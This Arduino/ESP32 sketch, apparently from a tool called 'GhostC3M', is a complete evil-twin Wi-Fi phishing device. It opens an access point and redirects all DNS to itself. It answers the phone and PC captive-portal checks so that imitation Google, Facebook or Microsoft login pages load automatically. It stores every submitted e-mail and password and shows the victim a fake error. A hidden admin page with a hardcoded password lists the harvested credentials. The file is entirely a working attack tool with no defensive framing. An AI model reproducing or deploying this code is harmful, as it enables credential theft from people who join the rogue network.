#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>

// --- IP fixo do SoftAP ---
const IPAddress AP_IP(192,168,4,1);

// --- Credenciais do AP de administração (sempre ativo) ---
const char* ADMIN_SSID = "GhostC3M";
const char* ADMIN_PSK  = "GhostC3M";

// --- DNS e HTTP Server ---
DNSServer dnsServer;
WebServer server(80);

// --- NVS via Preferences ---
Preferences prefs;

// --- Estado global ---
bool   portalMode     = false;
String portalSSID, portalTemplate;

// =================================================================
// 1) Painel de administração em /.admconf
// =================================================================
const char ADMIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>GhostC3M Admin</title>
  <style>
    body{margin:0;padding:10px;font-family:sans-serif;background:#222;color:#f60;}
    pre.ascii{font-family:monospace;color:#f60;text-align:center;line-height:1;margin:0 auto 20px;white-space: pre-wrap;}
    .panel{max-width:600px;margin:auto;}
    label{display:block;margin:12px 0 4px;color:#f60;}
    input,select,button{width:100%;padding:10px;margin-bottom:12px;box-sizing:border-box;border:1px solid #444;border-radius:4px;background:#333;color:#fff;}
    button{background:none;color:#1a73e8;cursor:pointer;}
    button:hover{background:#1a73e8;color:#fff;}
    hr{border:1px solid #444;margin:20px 0;}
    .actions button{width:48%;display:inline-block;}
    .actions button + button{margin-left:4%;}
    .dados{text-align:center;}
    .dados a{margin:0 8px;color:#1a73e8;}
  </style>
</head><body>
  <pre class="ascii">
   ______  ____  ____   ___     ______   _________    ______   ______   ____    ____  
 .' ___  ||_   ||   _|.'   `. .' ____ \ |  _   _  | .' ___  | / ____ `.|_   \  /   _| 
/ .'   \_|  | |__| | /  .-.  \| (___ \_||_/ | | \_|/ .'   \_| `'  __) |  |   \/   |   
| |   ____  |  __  | | |   | | _.____`.     | |    | |        _  |__ '.  | |\  /| |   
\ `.___]  |_| |  | |_\  `-'  /| \____) |   _| |_   \ `.___.'\| \____) | _| |_\/_| |_  
 `._____.'|____||____|`.___.'  \______.'  |_____|   `.____ .' \______.'|_____||_____|
  </pre>
  <div class="panel">
    <label>Portal SSID:</label>
    <input name="portal_ssid" value="%PORTAL_SSID%" form="fstart" required>
    <label>Modelo de Captive Portal:</label>
    <select name="template" form="fstart" required>
      <option value="google">Google</option>
      <option value="facebook">Facebook</option>
      <option value="microsoft">Microsoft</option>
    </select>
    <div class="actions">
      <form id="fstart" action="/.admconf/start" method="POST"><button type="submit">Iniciar Portal</button></form>
      <form action="/.admconf/stop" method="GET"><button type="submit">Parar Portal</button></form>
    </div>
    <hr>
    <div class="dados">
      <h2 style="color:#f60">Dados Capturados</h2>
      <a href="/.admconf/dados">Ver e-mails e senhas</a>
      <a href="/.admconf/factory_reset">Factory Reset</a>
    </div>
  </div>
</body></html>
)rawliteral";

// =================================================================
// 2) GOOGLE (responsivo + faixa colorida + Product Sans)
// =================================================================
const char GOOGLE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="pt-BR"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Google Login</title>
  <style>
    @media (max-width:600px){
      .box{width:95%!important;padding:1rem!important;}
      input,button{font-size:1rem!important;}
    }
    body{margin:0;padding:0;display:flex;align-items:center;justify-content:center;
         min-height:100vh;background:#f2f2f2;font-family:sans-serif;}
    .box{background:#fff;width:90%;max-width:360px;border-radius:8px;
         box-shadow:0 2px 10px rgba(0,0,0,0.1);padding:2rem;box-sizing:border-box;}
    h1{font-family:'Product Sans',sans-serif;font-size:1.5rem;text-align:center;color:#202124;margin-bottom:0.5rem;}
    hr.google-bar{border:none;height:4px;margin:0 0 1rem;
      background:linear-gradient(to right,
        #4285F4 0%,#4285F4 25%,
        #DB4437 25%,#DB4437 50%,
        #F4B400 50%,#F4B400 75%,
        #0F9D58 75%,#0F9D58 100%);
    }
    input,button{width:100%;margin:0.5rem 0;padding:0.8rem;
                 border-radius:4px;border:1px solid #dadce0;font-size:1rem;box-sizing:border-box;}
    button{border:none;background:#1a73e8;color:#fff;cursor:pointer;}
    button:hover{background:#1765c1;}
  </style>
</head><body>
  <div class="box">
    <h1>Google</h1>
    <hr class="google-bar"/>
    <form action="/dados" method="POST">
      <input type="email"    name="email" placeholder="E-mail" required>
      <input type="password" name="password" placeholder="Senha" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body></html>
)rawliteral";

// =================================================================
// 3) FACEBOOK (adicionada responsividade)
// =================================================================
const char FACEBOOK_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="pt-BR"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Facebook Login</title>
  <style>
    @media (max-width:600px){
      .box{width:95%!important;padding:1rem!important;}
      input,button{font-size:1rem!important;}
    }
    body{margin:0;padding:0;display:flex;align-items:center;justify-content:center;
         min-height:100vh;background:#eceff5;font-family:'Helvetica Neue',sans-serif;}
    .box{background:#fff;padding:2rem;width:90%;max-width:350px;border-radius:8px;
         box-shadow:0 2px 10px rgba(0,0,0,0.1);box-sizing:border-box;}
    .logo{text-align:center;color:#1877f2;font-size:2rem;font-weight:bold;margin-bottom:1rem;}
    input,button{width:100%;padding:0.8rem;margin:0.5rem 0;font-size:1rem;border-radius:4px;}
    input{border:1px solid #dddfe2;}
    button{border:none;background:#1877f2;color:#fff;cursor:pointer;}
    button:hover{background:#166fe5;}
  </style>
</head><body>
  <div class="box">
    <div class="logo">facebook</div>
    <form action="/dados" method="POST">
      <input type="text"     name="email"    placeholder="Email ou telefone" required>
      <input type="password" name="password" placeholder="Senha" required>
      <button type="submit">Entrar</button>
    </form>
  </div>
</body></html>
)rawliteral";

// =================================================================
// 4) MICROSOFT (grid 2×2 + responsivo)
// =================================================================
const char MICROSOFT_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="en"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Microsoft Login</title>
  <style>
    @media (max-width:600px){
      .card{width:95% !important;padding:1rem !important;}
      input,button{font-size:1rem !important;}
    }
    body {
      margin:0; padding:0;
      display:flex; align-items:center; justify-content:center;
      min-height:100vh; background:#f3f2f1;
      font-family:'Segoe UI',Tahoma,sans-serif;
    }
    .card {
      background:#fff;
      padding:2rem;
      width:360px; max-width:95%;
      border-radius:8px;
      box-shadow:0 2px 10px rgba(0,0,0,0.1);
      box-sizing:border-box;
      text-align:center;
    }
    .logo {
      display:grid;
      grid-template-columns:30px 30px;
      grid-template-rows:30px 30px;
      gap:4px;
      justify-content:center;
      margin:0 auto 1rem;
    }
    .logo div {
      width:30px; height:30px;
    }
    .logo .c1 { background:#F65314; }
    .logo .c2 { background:#7CBB00; }
    .logo .c3 { background:#00A1F1; }
    .logo .c4 { background:#FFBB00; }
    h1{margin:0 0 1rem;font-size:1.5rem;color:#201F1E;}
    label{display:block;text-align:left;font-size:0.9rem;margin:0.5rem 0 0.2rem;color:#464545;}
    input{width:100%;padding:0.8rem;margin-bottom:0.5rem;border:1px solid #8A8886;border-radius:4px;font-size:1rem;box-sizing:border-box;}
    button{width:100%;padding:0.8rem;border:none;background:#0078D4;color:#fff;border-radius:4px;font-size:1rem;cursor:pointer;}
    button:hover{background:#006AB1;}
  </style>
</head><body>
  <div class="card">
    <div class="logo">
      <div class="c1"></div>
      <div class="c2"></div>
      <div class="c3"></div>
      <div class="c4"></div>
    </div>
    <h1>Sign in</h1>
    <form action="/dados" method="POST">
      <label for="email">Email</label>
      <input id="email" type="email" name="email" placeholder="Email" required>
      <label for="pwd">Password</label>
      <input id="pwd"   type="password" name="password" placeholder="Password" required>
      <button type="submit">Sign In</button>
    </form>
  </div>
</body></html>
)rawliteral";

// =================================================================
// RenderAdmin: substitui %PORTAL_SSID% no ADMIN_HTML
// =================================================================
String renderAdmin(){
  String s = FPSTR(ADMIN_HTML);
  prefs.begin("ghostc3m", false);
    s.replace("%PORTAL_SSID%", prefs.getString("portal_ssid",""));
  prefs.end();
  return s;
}

// =================================================================
// HTTP Handlers
// =================================================================
void handleAdmConf(){
  server.send(200,"text/html; charset=UTF-8", renderAdmin());
}

void handleStart(){
  prefs.begin("ghostc3m",false);
    prefs.putString("portal_ssid",     server.arg("portal_ssid"));
    prefs.putString("portal_template", server.arg("template"));
  prefs.end();
  portalSSID     = server.arg("portal_ssid");
  portalTemplate = server.arg("template");
  portalMode     = true;

  WiFi.softAPConfig(AP_IP,AP_IP,IPAddress(255,255,255,0));
  WiFi.softAP(portalSSID.c_str());

  String html = "<h2>Portal iniciado!</h2>"
                "<p>Conecte-se à rede <b>"+portalSSID+"</b>.</p>"
                "<p><a href='/.admconf'>Voltar Admin</a></p>";
  server.send(200,"text/html", html);
}

void handleStop(){
  prefs.begin("ghostc3m",false);
    prefs.remove("portal_ssid");
    prefs.remove("portal_template");
    prefs.remove("log_dados");
  prefs.end();
  portalMode = false;

  WiFi.softAPConfig(AP_IP,AP_IP,IPAddress(255,255,255,0));
  WiFi.softAP(ADMIN_SSID, ADMIN_PSK);

  server.send(200,"text/html",
    "<h2>Portal parado</h2>"
    "<p>Admin em <b>"+String(ADMIN_SSID)+"</b></p>"
    "<p><a href='/.admconf'>Voltar Admin</a></p>"
  );
}

void handleFactoryReset(){
  prefs.begin("ghostc3m",false);
    prefs.clear();
  prefs.end();
  portalMode = false;

  WiFi.softAPConfig(AP_IP,AP_IP,IPAddress(255,255,255,0));
  WiFi.softAP(ADMIN_SSID, ADMIN_PSK);

  server.send(200,"text/html","<h2>Factory reset concluído!</h2><p><a href='/.admconf'>Voltar Admin</a></p>");
}

void handleRoot(){
  if(portalMode){
    server.sendHeader("Location","/"+portalTemplate,true);
    server.send(302,"text/plain","");
  } else {
    server.sendHeader("Location","/.admconf",true);
    server.send(302,"text/plain","");
  }
}

void handleGoogle(){    server.send_P(200,"text/html; charset=UTF-8",GOOGLE_HTML); }
void handleFacebook(){  server.send_P(200,"text/html; charset=UTF-8",FACEBOOK_HTML); }
void handleMicrosoft(){ server.send_P(200,"text/html; charset=UTF-8",MICROSOFT_HTML); }

void handleDados(){
  prefs.begin("ghostc3m",false);
    String log = prefs.getString("log_dados","");
    log += "> " + server.arg("email") + " | " + server.arg("password") + "<br>";
    prefs.putString("log_dados", log);
  prefs.end();

  String resp = "<h2>Cadastro inválido!</h2>"
                "<p class='msg'>Voltando ao login...</p>"
                "<meta http-equiv='refresh' content='3;url=/" + portalTemplate + "'/>";
  server.send(200,"text/html; charset=UTF-8",resp);
}

void handleListDados(){
  prefs.begin("ghostc3m",false);
    String log = prefs.getString("log_dados","(nenhum)");
  prefs.end();

  String html = "<h2>Histórico de dados</h2>"
                "<div style='background:#111;color:#fff;padding:10px;border-radius:4px;'><pre>"
                + log +
                "</pre></div>"
                "<p><a href='/.admconf'>Voltar Admin</a></p>";
  server.send(200,"text/html; charset=UTF-8",html);
}

void handleAndroid(){
  server.sendHeader("Location","/"+portalTemplate,true);
  server.send(302,"text/plain","");
}
void handleiOS(){
  String r = "<!DOCTYPE html><html><head>"
             "<meta http-equiv='refresh' content='0;url=/"
             + portalTemplate + "'/>"
             "</head><body></body></html>";
  server.send(200,"text/html; charset=UTF-8",r);
}
void handleWin(){
  server.send(200,"text/plain","Microsoft NCSI");
}
void handleNotFound(){
  server.sendHeader("Location","/",true);
  server.send(302,"text/plain","");
}

// =================================================================
// setup() & loop()
// =================================================================
void setup(){
  Serial.begin(115200);

  // carrega portal settings
  prefs.begin("ghostc3m",false);
    portalSSID     = prefs.getString("portal_ssid","");
    portalTemplate = prefs.getString("portal_template","");
  prefs.end();

  // monta AP + STA simultâneos
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAPConfig(AP_IP,AP_IP,IPAddress(255,255,255,0));
  WiFi.softAP(ADMIN_SSID,ADMIN_PSK);

  if(portalSSID.length()){
    portalMode = true;
    WiFi.softAP(portalSSID.c_str());
  }

  // inicia DNS captive-portal
  dnsServer.start(53,"*",AP_IP);

  // rotas
  server.on("/",                     HTTP_GET,  handleRoot);
  server.on("/.admconf",             HTTP_GET,  handleAdmConf);
  server.on("/.admconf/start",       HTTP_POST, handleStart);
  server.on("/.admconf/stop",        HTTP_GET,  handleStop);
  server.on("/.admconf/factory_reset",HTTP_GET, handleFactoryReset);
  server.on("/.admconf/dados",       HTTP_GET,  handleListDados);

  server.on("/google",               HTTP_GET,  handleGoogle);
  server.on("/facebook",             HTTP_GET,  handleFacebook);
  server.on("/microsoft",            HTTP_GET,  handleMicrosoft);

  server.on("/dados",                HTTP_POST, handleDados);

  server.on("/generate_204",         HTTP_GET,  handleAndroid);
  server.on("/hotspot-detect.html",  HTTP_GET,  handleiOS);
  server.on("/ncsi.txt",             HTTP_GET,  handleWin);

  server.onNotFound(handleNotFound);
  server.begin();

  Serial.printf("AP admin %s  captive %s  IP %s\n",
                ADMIN_SSID,
                portalMode?portalSSID.c_str():"(off)",
                AP_IP.toString().c_str()
  );
}

void loop(){
  dnsServer.processNextRequest();
  server.handleClient();
}
